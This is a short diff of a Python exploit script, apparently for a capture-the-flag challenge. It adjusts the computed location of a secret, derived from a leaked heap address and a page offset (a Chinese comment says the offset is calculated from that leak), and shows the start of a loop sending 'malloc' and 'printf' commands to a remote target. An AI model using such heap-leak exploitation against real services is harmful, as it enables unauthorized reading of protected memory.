@@ -79,8 +79,8 @@ def thread3(r1, index, addr):
 
 
 secret = b''
-secret_loc = ((heap_leak>>16)<<16) + 0x2fb0
-page_offsetxxx = -4 # 根据heap_leak的值算出来的
+secret_loc = ((heap_leak>>16)<<16) + 0x5030
+page_offsetxxx = -5 # 根据heap_leak的值算出来的
 
 while True:
     r1.sendline(f'malloc {1} printf {1}'.encode('utf-8'))
